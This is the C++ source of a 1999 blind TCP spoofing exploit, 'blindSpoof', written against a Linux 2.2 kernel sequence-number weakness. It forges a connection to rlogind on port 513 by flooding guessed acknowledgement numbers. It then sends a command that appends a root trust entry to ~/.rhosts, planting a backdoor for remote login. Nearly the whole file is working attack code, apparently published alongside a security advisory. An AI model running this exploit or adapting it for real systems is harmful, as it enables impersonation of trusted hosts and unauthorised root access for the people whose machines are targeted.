/*** Exploit for the 2.2 linux-kernel TCP/IP weakness. 
 *** (C) 1999 by S. Krahmer. 
 *** THERE IS ABSOLUTELY NO WARRANTY. YOU USE IT AT YOUR OWN RSIK!
 *** THIS PROGRAM IS LICESED UNDER THE GPL and belongs to a security-
 *** advisory of team teso. You should get the full advisory with paper
 *** on either 
 *** http://www.cs.uni-potsdam.de/homepages/students/linuxer or
 *** http://teso.scene.at
 ***
 *** !!! This program needs libusi++ 1.6 (!) or higher, the other one
 *** !!! is for libusi++ up (and including) to 1.5.
 ***
 *** The bugdiscovery and the exploit is due to:
 ***
 *** Stealth	http://www.kalug.lug.net/stealth
 *** S. Krahmer http://www.cs.uni-potsdam.de/homepages/students/linxuer
 ***
 *** c++ blindSpoof.cc -lusi++ -lpcap	(this is LINUX source!)
 *** Libusi++ is available on my homepage.
 *** Achtung: Gehen Sie nicht in den 100 Meilen tiefen Wald! ;-)
 ***/
#include <stdio.h>
#include <iostream>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <usi++/usi++.h>

#define XPORT 513

// may be changed, my best results were around 2000,
// but also diffs of > 5000 can happen :)
// change it it really not works
#define MAXPACK 3000

// define this if you want to exploit rlogind
// if not, you will just spoof a connection to XPORT
#define EXPLOIT_RLOGIND 

// uses eth0 for packet-capturing!
TCP *pingVictum(char *, char *, char *);
int printInfo(TCP *);
bool wrongPacket(TCP *, TCP *);

int main(int argc, char **argv)
{
	// yes, script-kidz! this is hardcoded to prevent you from usage.
	const char *remoteUser = "stealth",
	           *localUser  = "stealth",
		   *command    = "echo liane root>>~/.rhosts\n";
	char sbuf[1000];
	
	if (argc < 4) {
		printf("Usage %s [destination-IP] [source-IP] [spoofed-IP]\n", argv[0]);
		exit(1);
	}
	cout<<"blindSpoof-exploit by S. Krahmer\n"
	      "http://www.cs.uni-potsdam.de/homepages/students/linuxer\n\n";	
	// would be connect() 
       	TCP *conn = pingVictum(argv[1], argv[2], argv[3]);

#ifdef EXPLOIT_RLOGIND
	conn->set_flags(0);
	sprintf(sbuf, "\0");
	conn->sendpack(sbuf, 1);
	sleep(1);
	
	cout<<"Sending local username: "<<localUser<<endl;
	
	// send local username
	conn->set_seq(conn->get_seq() + 1);
	memset(sbuf, 0, 1000);
	snprintf(sbuf, sizeof(sbuf), "%s\0", localUser);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	
	// we don't know about the lag, so i hope that 7 in sec.
	// the victum has sent an ACK
	sleep(7);
	
	cout<<"Sending remote username: "<<remoteUser<<endl;
	
	// send remote username
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", remoteUser);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	sleep(7);
	
	cout<<"Sending terminal-type and speed.\n";
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", "linux/38400");
	conn->sendpack(sbuf, strlen(sbuf) + 1);
	sleep(7);
	
	
	cout<<"Sending command: "<<command<<endl;
	conn->set_seq(conn->get_seq() + strlen(sbuf) + 1);
	memset(sbuf, 0, sizeof(sbuf));
	snprintf(sbuf, sizeof(sbuf), "%s\0", command);
	conn->sendpack(sbuf, strlen(sbuf) + 1);
#else
	cout<<"Connection to port "<<XPORT<<" should be established.\n";
#endif
	delete conn;
	return 0;
}

/* Spoof a connection. */
TCP *pingVictum(char *host, char *src, char *spoofed)
{
	char buf[100], sr[1000], dst[1000];
        TCP *victumLow = new TCP(host),
	    *victumSpoofed = new TCP(host),
	    *sn = new TCP(host);    
        int myISN = rand(), sport = 512 + rand()%512;
        
        sn->init_device("eth0", 1, 500);

        victumLow->set_flags(TH_SYN);
     	victumLow->set_dstport(XPORT);	// rlogin
        victumLow->set_srcport(sport);	// from a privileged port
        victumLow->set_src(src);                
    	victumLow->set_seq(myISN);
		
        victumSpoofed->set_flags(TH_SYN);
     	victumSpoofed->set_dstport(XPORT);	
        victumSpoofed->set_srcport(sport);	
        victumSpoofed->set_src(spoofed);
	victumSpoofed->set_seq(myISN);		// we must save the ISN
	
	// send SYN to get low end of ISN
	victumLow->sendpack("");
		
	// send spoofed SYN 
        victumSpoofed->sendpack("");
	
	cout<<"Using sourceport "<<victumSpoofed->get_srcport()<<endl;
	
	// wait for SYN/ACK of low packet
	while (wrongPacket(sn, victumLow)) {
           	sn->sniffpack(buf, 100);
                printf("%s:%d -> %s:%d ", sn->get_src(1, sr, 1000), sn->get_srcport(),
		                          sn->get_dst(1, dst, 1000), sn->get_dstport());
                printInfo(sn);
        }
	int lowISN = sn->get_seq();		
	sleep(2);
	
	// NOTE! Even if we sent the SYN before the spoofed SYN, the
	// spoofed SYN can arrive first, due to routing reasons.
	// Althought this is NOT very likely, we have to keep it in mind.
	cout<<"Low end: "<<(unsigned)lowISN<<"\n";	
        victumSpoofed->set_flags(TH_ACK);
    	victumSpoofed->set_seq(myISN + 1);

	// 	
        for (int i = lowISN; i < lowISN + MAXPACK; i++) {
                victumSpoofed->set_ack(i);
                victumSpoofed->sendpack("");
		printf("%u\r", i); fflush(stdout);
		// maybe you have to place a usleep() here, depends on
		// your devices
		usleep(500);
        }
	cout<<endl;
	delete sn;
        delete victumLow;
	
	// from now, the connection should be established!
	return victumSpoofed;
}


// give out some infos about the received packet
int printInfo(TCP* r)
{
	cout<<"[flags: ";
	if (r->get_flags() & TH_FIN)
		cout<<"FIN ";
	if (r->get_flags() & TH_SYN)
		cout<<"SYN ";
	if (r->get_flags() & TH_RST)
		cout<<"RST ";
	if (r->get_flags() & TH_PUSH)
		cout<<"PUSH ";
	if (r->get_flags() & TH_ACK)
		cout<<"ACK ";
	if (r->get_flags() & TH_URG)
		cout<<"URG ";
	cout<<"] [ACK: "<<r->get_ack()<<"] [SEQ: "<<r->get_seq()<<"]"<<endl;
	return 0;
}

/* returns true is packet is WRONG
 */
bool wrongPacket(TCP *p1, TCP *p2)
{
   	if (p1->get_src() != p2->get_dst())
           	return true;
        if (p1->get_dst() != p2->get_src())
           	return true;
        if (p1->get_dstport() != p2->get_srcport())
           	return true;
        if (p1->get_srcport() != p2->get_dstport())
           	return true;
        if (p1->get_ack() != (p2->get_seq() + 1))
           	return true;
        return false;
}

